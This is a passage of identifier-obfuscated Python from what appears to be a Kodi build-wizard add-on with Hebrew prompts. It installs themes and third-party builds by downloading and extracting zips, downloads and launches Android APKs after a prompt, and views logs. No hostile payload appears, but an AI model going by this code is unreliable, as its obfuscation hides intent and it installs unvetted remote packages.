			OOO0O0000O0OOO0OO =os .path .join (PACKAGES ,'%s.zip'%O000O000OOO00OOOO )#line:4547
			try :os .remove (OOO0O0000O0OOO0OO )#line:4548
			except :pass #line:4549
			downloader .download (O00O0O0OO0OOOO000 ,OOO0O0000O0OOO0OO ,DP )#line:4550
			xbmc .sleep (1000 )#line:4551
			DP .update (0 ,"","Installing %s "%OOOO0O000O0O00O00 )#line:4552
			OOO0000000O000OOO =False #line:4553
			if url not in ["fresh","normal"]:#line:4554
				OOO0000000O000OOO =testTheme (OOO0O0000O0OOO0OO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4555
				O00OOOO0000000O0O =testGui (OOO0O0000O0OOO0OO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4556
				if OOO0000000O000OOO ==True :#line:4557
					wiz .lookandFeelData ('save')#line:4558
					OOO0O000000OO0OO0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4559
					OOOOO00OOOO000OOO =xbmc .getSkinDir ()#line:4560
					skinSwitch .swapSkins (OOO0O000000OO0OO0 )#line:4562
					OOO0O00OOO0O00OOO =0 #line:4563
					xbmc .sleep (1000 )#line:4564
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0O00OOO0O00OOO <150 :#line:4565
						OOO0O00OOO0O00OOO +=1 #line:4566
						xbmc .sleep (1000 )#line:4567
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4568
						wiz .ebi ('SendClick(11)')#line:4569
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4570
					xbmc .sleep (1000 )#line:4571
			OOO0O0O0OOOOOOOO0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4572
			DP .update (0 ,OOO0O0O0OOOOOOOO0 ,'','אנא המתן')#line:4573
			OO0O000OO00000OOO ,O0O00OO0OOO0OO00O ,O0O0OOOOO0000OO00 =extract .all (OOO0O0000O0OOO0OO ,HOME ,DP ,title =OOO0O0O0OOOOOOOO0 )#line:4574
			wiz .setS ('buildtheme',theme )#line:4575
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO0O000OO00000OOO ,O0O00OO0OOO0OO00O ))#line:4576
			DP .close ()#line:4577
			if url not in ["fresh","normal"]:#line:4578
				wiz .forceUpdate ()#line:4579
				if KODIV >=17 :wiz .kodi17Fix ()#line:4580
				if O00OOOO0000000O0O ==True :#line:4581
					wiz .lookandFeelData ('save')#line:4582
					wiz .defaultSkin ()#line:4583
					OOOOO00OOOO000OOO =wiz .getS ('defaultskin')#line:4584
					skinSwitch .swapSkins (OOOOO00OOOO000OOO )#line:4585
					OOO0O00OOO0O00OOO =0 #line:4586
					xbmc .sleep (1000 )#line:4587
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0O00OOO0O00OOO <150 :#line:4588
						OOO0O00OOO0O00OOO +=1 #line:4589
						xbmc .sleep (1000 )#line:4590
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4592
						wiz .ebi ('SendClick(11)')#line:4593
					wiz .lookandFeelData ('restore')#line:4594
				elif OOO0000000O000OOO ==True :#line:4595
					skinSwitch .swapSkins (OOOOO00OOOO000OOO )#line:4596
					OOO0O00OOO0O00OOO =0 #line:4597
					xbmc .sleep (1000 )#line:4598
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0O00OOO0O00OOO <150 :#line:4599
						OOO0O00OOO0O00OOO +=1 #line:4600
						xbmc .sleep (1000 )#line:4601
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4603
						wiz .ebi ('SendClick(11)')#line:4604
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4605
					wiz .lookandFeelData ('restore')#line:4606
				else :#line:4607
					wiz .ebi ("ReloadSkin()")#line:4608
					xbmc .sleep (1000 )#line:4609
					wiz .ebi ("Container.Refresh")#line:4610
		else :#line:4611
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4612
def skin_homeselect ():#line:4616
	try :#line:4618
		O00O0OO000000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4619
		O0O0O00O0OO000OO0 =open (O00O0OO000000O0OO ,'r')#line:4621
		O0O0OO000O0OOO0O0 =O0O0O00O0OO000OO0 .read ()#line:4622
		O0O0O00O0OO000OO0 .close ()#line:4623
		OOO0OO0O00OOO00O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4624
		OO0O0O0O0O0O0O000 =re .compile (OOO0OO0O00OOO00O0 ).findall (O0O0OO000O0OOO0O0 )[0 ]#line:4625
		O0O0O00O0OO000OO0 =open (O00O0OO000000O0OO ,'w')#line:4626
		O0O0O00O0OO000OO0 .write (O0O0OO000O0OOO0O0 .replace ('<setting id="HomeS" type="string%s/setting>'%OO0O0O0O0O0O0O000 ,'<setting id="HomeS" type="string"></setting>'))#line:4627
		O0O0O00O0OO000OO0 .close ()#line:4628
	except :#line:4629
		pass #line:4630
def skin_lower ():#line:4633
	O0OO0OOO0O0O0O0O0 =(ADDON .getSetting ("lower"))#line:4634
	if O0OO0OOO0O0O0O0O0 =='true':#line:4635
		try :#line:4638
			OOO00O0O0OOOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4639
			OOOOO00OOO000O00O =open (OOO00O0O0OOOOO00O ,'r')#line:4641
			OO0OOO0000000O0O0 =OOOOO00OOO000O00O .read ()#line:4642
			OOOOO00OOO000O00O .close ()#line:4643
			O0O0O000OO000O0OO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4644
			O000O00OO0O00OOOO =re .compile (O0O0O000OO000O0OO ).findall (OO0OOO0000000O0O0 )[0 ]#line:4645
			OOOOO00OOO000O00O =open (OOO00O0O0OOOOO00O ,'w')#line:4646
			OOOOO00OOO000O00O .write (OO0OOO0000000O0O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%O000O00OO0O00OOOO ,'<setting id="none_widget" type="bool">true</setting>'))#line:4647
			OOOOO00OOO000O00O .close ()#line:4648
		except :#line:4714
			pass #line:4715
def thirdPartyInstall (O000O00OO0OO000OO ,OOOO0OOO00OOOO0OO ):#line:4717
	if not wiz .workingURL (OOOO0OOO00OOOO0OO ):#line:4718
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4719
	O0000O0OO000O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O00OO0OO000OO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4720
	if O0000O0OO000O0O0O ==1 :#line:4721
		freshStart ('third',True )#line:4722
	wiz .clearS ('build')#line:4723
	O00O0OOOOOO0OO0O0 =O000O00OO0OO000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4724
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4725
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O00OO0OO000OO ),'','אנא המתן')#line:4726
	O000O0O0O0000OO0O =os .path .join (PACKAGES ,'%s.zip'%O00O0OOOOOO0OO0O0 )#line:4727
	try :os .remove (O000O0O0O0000OO0O )#line:4728
	except :pass #line:4729
	downloader .download (OOOO0OOO00OOOO0OO ,O000O0O0O0000OO0O ,DP )#line:4730
	xbmc .sleep (1000 )#line:4731
	OO00OO0000O00OOO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O00OO0OO000OO )#line:4732
	DP .update (0 ,OO00OO0000O00OOO0 ,'','אנא המתן')#line:4733
	OOO000OOO00OOOO0O ,O000O0O00OOOOOO00 ,OOOOOOOOOO00OOOO0 =extract .all (O000O0O0O0000OO0O ,HOME ,DP ,title =OO00OO0000O00OOO0 )#line:4734
	if int (float (OOO000OOO00OOOO0O ))>0 :#line:4735
		wiz .fixmetas ()#line:4736
		wiz .lookandFeelData ('save')#line:4737
		wiz .defaultSkin ()#line:4738
		wiz .setS ('installed','true')#line:4740
		wiz .setS ('extract',str (OOO000OOO00OOOO0O ))#line:4741
		wiz .setS ('errors',str (O000O0O00OOOOOO00 ))#line:4742
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO000OOO00OOOO0O ,O000O0O00OOOOOO00 ))#line:4743
		try :os .remove (O000O0O0O0000OO0O )#line:4744
		except :pass #line:4745
		if int (float (O000O0O00OOOOOO00 ))>0 :#line:4746
			O000O000OOOOO0OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O00OO0OO000OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOO000OOO00OOOO0O ,'%',COLOR1 ,O000O0O00OOOOOO00 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4747
			if O000O000OOOOO0OOO :#line:4748
				if isinstance (O000O0O00OOOOOO00 ,unicode ):#line:4749
					OOOOOOOOOO00OOOO0 =OOOOOOOOOO00OOOO0 .encode ('utf-8')#line:4750
				wiz .TextBox (ADDONTITLE ,OOOOOOOOOO00OOOO0 )#line:4751
	DP .close ()#line:4752
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4753
	if INSTALLMETHOD ==1 :O0OO0O0OOOOO00OO0 =1 #line:4754
	elif INSTALLMETHOD ==2 :O0OO0O0OOOOO00OO0 =0 #line:4755
	else :O0OO0O0OOOOO00OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4756
	if O0OO0O0OOOOO00OO0 ==1 :wiz .reloadFix ()#line:4757
	else :wiz .killxbmc (True )#line:4758
def testTheme (O0OO00OO0OO000O00 ):#line:4760
	OOOO00OO0OO0O0O00 =zipfile .ZipFile (O0OO00OO0OO000O00 )#line:4761
	for O0O00000000OO0O00 in OOOO00OO0OO0O0O00 .infolist ():#line:4762
		if '/settings.xml'in O0O00000000OO0O00 .filename :#line:4763
			return True #line:4764
	return False #line:4765
def testGui (OOO0OOO0O0OO0O0OO ):#line:4767
	OOO00O0OO00000O0O =zipfile .ZipFile (OOO0OOO0O0OO0O0OO )#line:4768
	for O0OO0OO0OOOOOOOO0 in OOO00O0OO00000O0O .infolist ():#line:4769
		if '/guisettings.xml'in O0OO0OO0OOOOOOOO0 .filename :#line:4770
			return True #line:4771
	return False #line:4772
def apkInstaller (O0O0OOOO0O0OOOOOO ,O0O0O0000O000OO0O ):#line:4774
	wiz .log (O0O0OOOO0O0OOOOOO )#line:4775
	wiz .log (O0O0O0000O000OO0O )#line:4776
	if wiz .platform ()=='android':#line:4777
		O0O0O0OOOO0O00OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OOOO0O0OOOOOO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4778
		if not O0O0O0OOOO0O00OO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4779
		OO00O0O000O0O0O0O =O0O0OOOO0O0OOOOOO #line:4780
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4781
		if not wiz .workingURL (O0O0O0000O000OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4782
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O0O000O0O0O0O ),'','אנא המתן')#line:4783
		OO0O00O000000O0O0 =os .path .join (PACKAGES ,"%s.apk"%O0O0OOOO0O0OOOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4784
		try :os .remove (OO0O00O000000O0O0 )#line:4785
		except :pass #line:4786
		downloader .download (O0O0O0000O000OO0O ,OO0O00O000000O0O0 ,DP )#line:4787
		xbmc .sleep (100 )#line:4788
		DP .close ()#line:4789
		notify .apkInstaller (O0O0OOOO0O0OOOOOO )#line:4790
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO0O00O000000O0O0 +'")')#line:4791
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4792
def createMenu (OOO0000OOO0O0O000 ,O0O000O0000000000 ,OO0O00O0O0O00OOO0 ):#line:4798
	if OOO0000OOO0O0O000 =='saveaddon':#line:4799
		OOOO0O0OO0OOOO00O =[]#line:4800
		O00000O0OOO0OOO0O =urllib .quote_plus (O0O000O0000000000 .lower ().replace (' ',''))#line:4801
		OO0OOOOO000OOO0O0 =O0O000O0000000000 .replace ('Debrid','Real Debrid')#line:4802
		OO0O0OO00OO0OOOOO =urllib .quote_plus (OO0O00O0O0O00OOO0 .lower ().replace (' ',''))#line:4803
		OO0O00O0O0O00OOO0 =OO0O00O0O0O00OOO0 .replace ('url','URL Resolver')#line:4804
		OOOO0O0OO0OOOO00O .append ((THEME2 %OO0O00O0O0O00OOO0 .title (),' '))#line:4805
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Save %s Data'%OO0OOOOO000OOO0O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00000O0OOO0OOO0O ,OO0O0OO00OO0OOOOO )))#line:4806
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Restore %s Data'%OO0OOOOO000OOO0O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00000O0OOO0OOO0O ,OO0O0OO00OO0OOOOO )))#line:4807
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Clear %s Data'%OO0OOOOO000OOO0O0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O00000O0OOO0OOO0O ,OO0O0OO00OO0OOOOO )))#line:4808
	elif OOO0000OOO0O0O000 =='save':#line:4809
		OOOO0O0OO0OOOO00O =[]#line:4810
		O00000O0OOO0OOO0O =urllib .quote_plus (O0O000O0000000000 .lower ().replace (' ',''))#line:4811
		OO0OOOOO000OOO0O0 =O0O000O0000000000 .replace ('Debrid','Real Debrid')#line:4812
		OO0O0OO00OO0OOOOO =urllib .quote_plus (OO0O00O0O0O00OOO0 .lower ().replace (' ',''))#line:4813
		OO0O00O0O0O00OOO0 =OO0O00O0O0O00OOO0 .replace ('url','URL Resolver')#line:4814
		OOOO0O0OO0OOOO00O .append ((THEME2 %OO0O00O0O0O00OOO0 .title (),' '))#line:4815
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Register %s'%OO0OOOOO000OOO0O0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O00000O0OOO0OOO0O ,OO0O0OO00OO0OOOOO )))#line:4816
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Save %s Data'%OO0OOOOO000OOO0O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00000O0OOO0OOO0O ,OO0O0OO00OO0OOOOO )))#line:4817
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Restore %s Data'%OO0OOOOO000OOO0O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00000O0OOO0OOO0O ,OO0O0OO00OO0OOOOO )))#line:4818
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Import %s Data'%OO0OOOOO000OOO0O0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O00000O0OOO0OOO0O ,OO0O0OO00OO0OOOOO )))#line:4819
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Clear Addon %s Data'%OO0OOOOO000OOO0O0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O00000O0OOO0OOO0O ,OO0O0OO00OO0OOOOO )))#line:4820
	elif OOO0000OOO0O0O000 =='install':#line:4821
		OOOO0O0OO0OOOO00O =[]#line:4822
		OO0O0OO00OO0OOOOO =urllib .quote_plus (OO0O00O0O0O00OOO0 )#line:4823
		OOOO0O0OO0OOOO00O .append ((THEME2 %OO0O00O0O0O00OOO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO0O0OO00OO0OOOOO )))#line:4824
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO0O0OO00OO0OOOOO )))#line:4825
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO0O0OO00OO0OOOOO )))#line:4826
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO0O0OO00OO0OOOOO )))#line:4827
		OOOO0O0OO0OOOO00O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO0O0OO00OO0OOOOO )))#line:4828
	OOOO0O0OO0OOOO00O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4829
	return OOOO0O0OO0OOOO00O #line:4830
def toggleCache (O000OO00OO00O0OO0 ):#line:4832
	OO000O00O0000O0OO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4833
	O0OOOOOO0O00OO000 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4834
	if O000OO00OO00O0OO0 in ['true','false']:#line:4835
		for O0OO0O000000O000O in OO000O00O0000O0OO :#line:4836
			wiz .setS (O0OO0O000000O000O ,O000OO00OO00O0OO0 )#line:4837
	else :#line:4838
		if not O000OO00OO00O0OO0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4839
			try :#line:4840
				O0OO0O000000O000O =O0OOOOOO0O00OO000 [OO000O00O0000O0OO .index (O000OO00OO00O0OO0 )]#line:4841
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0OO0O000000O000O ))#line:4842
			except :#line:4843
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O000OO00OO00O0OO0 ))#line:4844
		else :#line:4845
			OOO0O00OOOO0O0O00 ='true'if wiz .getS (O000OO00OO00O0OO0 )=='false'else 'false'#line:4846
			wiz .setS (O000OO00OO00O0OO0 ,OOO0O00OOOO0O0O00 )#line:4847
def playVideo (OOOOO00OOO00O0OOO ):#line:4849
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOOOO00OOO00O0OOO )#line:4850
	if 'watch?v='in OOOOO00OOO00O0OOO :#line:4851
		OOO00OOO0O0O00O0O ,OOO00000O00O0O0O0 =OOOOO00OOO00O0OOO .split ('?')#line:4852
		OO0OOO0O0000O00O0 =OOO00000O00O0O0O0 .split ('&')#line:4853
		for OO0OOO0OO0000O000 in OO0OOO0O0000O00O0 :#line:4854
			if OO0OOO0OO0000O000 .startswith ('v='):#line:4855
				OOOOO00OOO00O0OOO =OO0OOO0OO0000O000 [2 :]#line:4856
				break #line:4857
			else :continue #line:4858
	elif 'embed'in OOOOO00OOO00O0OOO or 'youtu.be'in OOOOO00OOO00O0OOO :#line:4859
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOOOO00OOO00O0OOO )#line:4860
		OOO00OOO0O0O00O0O =OOOOO00OOO00O0OOO .split ('/')#line:4861
		if len (OOO00OOO0O0O00O0O [-1 ])>5 :#line:4862
			OOOOO00OOO00O0OOO =OOO00OOO0O0O00O0O [-1 ]#line:4863
		elif len (OOO00OOO0O0O00O0O [-2 ])>5 :#line:4864
			OOOOO00OOO00O0OOO =OOO00OOO0O0O00O0O [-2 ]#line:4865
	wiz .log ("YouTube URL: %s"%OOOOO00OOO00O0OOO )#line:4866
	yt .PlayVideo (OOOOO00OOO00O0OOO )#line:4867
def viewLogFile ():#line:4869
	O000OO0O00O0OO0OO =wiz .Grab_Log (True )#line:4870
	OOOO0000000OO0O00 =wiz .Grab_Log (True ,True )#line:4871
	O000OO00OO00OO0OO =0 ;O0O00O0OO0O0O0000 =O000OO0O00O0OO0OO #line:4872
	if not OOOO0000000OO0O00 ==False and not O000OO0O00O0OO0OO ==False :#line:4873
		O000OO00OO00OO0OO =DIALOG .select (ADDONTITLE ,["View %s"%O000OO0O00O0OO0OO .replace (LOG ,""),"View %s"%OOOO0000000OO0O00 .replace (LOG ,"")])#line:4874
		if O000OO00OO00OO0OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4875
	elif O000OO0O00O0OO0OO ==False and OOOO0000000OO0O00 ==False :#line:4876
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4877
		return #line:4878
	elif not O000OO0O00O0OO0OO ==False :O000OO00OO00OO0OO =0 #line:4879
	elif not OOOO0000000OO0O00 ==False :O000OO00OO00OO0OO =1 #line:4880
	O0O00O0OO0O0O0000 =O000OO0O00O0OO0OO if O000OO00OO00OO0OO ==0 else OOOO0000000OO0O00 #line:4882
	OOO000OOO0O00O00O =wiz .Grab_Log (False )if O000OO00OO00OO0OO ==0 else wiz .Grab_Log (False ,True )#line:4883
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0O00O0OO0O0O0000 ),OOO000OOO0O00O00O )#line:4885
def errorChecking (log =None ,count =None ,all =None ):#line:4887
	if log ==None :#line:4888
		O00OO00OOOOO000O0 =wiz .Grab_Log (True )#line:4889
		OO0O0OOOO00OO000O =wiz .Grab_Log (True ,True )#line:4890
		if not OO0O0OOOO00OO000O ==False and not O00OO00OOOOO000O0 ==False :#line:4891
			O0O00000OOO000O00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O00OO00OOOOO000O0 .replace (LOG ,""),errorChecking (O00OO00OOOOO000O0 ,True ,True )),"View %s: %s error(s)"%(OO0O0OOOO00OO000O .replace (LOG ,""),errorChecking (OO0O0OOOO00OO000O ,True ,True ))])#line:4892
			if O0O00000OOO000O00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4893
		elif O00OO00OOOOO000O0 ==False and OO0O0OOOO00OO000O ==False :#line:4894
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4895
			return #line:4896
		elif not O00OO00OOOOO000O0 ==False :O0O00000OOO000O00 =0 #line:4897
		elif not OO0O0OOOO00OO000O ==False :O0O00000OOO000O00 =1 #line:4898
		log =O00OO00OOOOO000O0 if O0O00000OOO000O00 ==0 else OO0O0OOOO00OO000O #line:4899
	if log ==False :#line:4900
		if count ==None :#line:4901
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4902
			return False #line:4903
		else :#line:4904
			return 0 #line:4905
	else :#line:4906
		if os .path .exists (log ):#line:4907
			O0O0O000000OOO000 =open (log ,mode ='r');OOO0000OOOOOO0O0O =O0O0O000000OOO000 .read ().replace ('\n','').replace ('\r','');O0O0O000000OOO000 .close ()#line:4908
			O000O00000OO0O00O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO0000OOOOOO0O0O )#line:4909
			if not count ==None :#line:4910
				if all ==None :#line:4911
					O0O000OOO0000O00O =0 #line:4912
					for O00OOOOO00OO00O0O in O000O00000OO0O00O :#line:4913
						if ADDON_ID in O00OOOOO00OO00O0O :O0O000OOO0000O00O +=1 #line:4914
					return O0O000OOO0000O00O #line:4915
				else :return len (O000O00000OO0O00O )#line:4916
			if len (O000O00000OO0O00O )>0 :#line:4917
				O0O000OOO0000O00O =0 ;OO0O0OOOO0OOO00OO =""#line:4918
				for O00OOOOO00OO00O0O in O000O00000OO0O00O :#line:4919
					if all ==None and not ADDON_ID in O00OOOOO00OO00O0O :continue #line:4920
					else :#line:4921
						O0O000OOO0000O00O +=1 #line:4922
						OO0O0OOOO0OOO00OO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0O000OOO0000O00O ,O00OOOOO00OO00O0O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4923
				if O0O000OOO0000O00O >0 :#line:4924
					wiz .TextBox (ADDONTITLE ,OO0O0OOOO0OOO00OO )#line:4925
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4926
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4927
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4928
ACTION_PREVIOUS_MENU =10 #line:4930
ACTION_NAV_BACK =92 #line:4931
ACTION_MOVE_LEFT =1 #line:4932
ACTION_MOVE_RIGHT =2 #line:4933
ACTION_MOVE_UP =3 #line:4934
ACTION_MOVE_DOWN =4 #line:4935
ACTION_MOUSE_WHEEL_UP =104 #line:4936
ACTION_MOUSE_WHEEL_DOWN =105 #line:4937
ACTION_MOVE_MOUSE =107 #line:4938
ACTION_SELECT_ITEM =7 #line:4939
ACTION_BACKSPACE =110 #line:4940
ACTION_MOUSE_LEFT_CLICK =100 #line:4941
ACTION_MOUSE_LONG_CLICK =108 #line:4942
def LogViewer (default =None ):#line:4944
	class OOO00O00O0O000OO0 (xbmcgui .WindowXMLDialog ):#line:4945
		def __init__ (O0OOO00O0OOO0OOOO ,*O0OO0OO0OOOO0000O ,**O0OOOOO000000000O ):#line:4946
			O0OOO00O0OOO0OOOO .default =O0OOOOO000000000O ['default']#line:4947
		def onInit (OO0O00OO000OOOOO0 ):#line:4949
			OO0O00OO000OOOOO0 .title =101 #line:4950
			OO0O00OO000OOOOO0 .msg =102 #line:4951
			OO0O00OO000OOOOO0 .scrollbar =103 #line:4952
			OO0O00OO000OOOOO0 .upload =201 #line:4953
			OO0O00OO000OOOOO0 .kodi =202 #line:4954
			OO0O00OO000OOOOO0 .kodiold =203 #line:4955
			OO0O00OO000OOOOO0 .wizard =204 #line:4956
			OO0O00OO000OOOOO0 .okbutton =205 #line:4957
			OO0O0O000O00OO0O0 =open (OO0O00OO000OOOOO0 .default ,'r')#line:4958
			OO0O00OO000OOOOO0 .logmsg =OO0O0O000O00OO0O0 .read ()#line:4959
			OO0O0O000O00OO0O0 .close ()#line:4960
			OO0O00OO000OOOOO0 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O00OO000OOOOO0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4961
			OO0O00OO000OOOOO0 .showdialog ()#line:4962
